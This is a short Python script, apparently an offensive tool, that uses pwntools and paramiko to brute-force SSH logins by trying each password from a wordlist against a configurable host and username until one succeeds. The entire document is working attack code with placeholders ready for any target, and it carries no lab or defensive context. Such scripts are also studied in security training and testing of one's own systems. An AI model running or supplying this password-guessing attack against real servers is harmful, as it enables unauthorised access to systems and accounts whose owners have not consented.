from pwn import *
import paramiko

host = "192.168.0.1"     # Change this
username = "username"    # Change this
attempts = 0

with open("ssh-passwords-list.txt", "r") as password_list:  # Change this and put your list name
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password,timeout=1)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1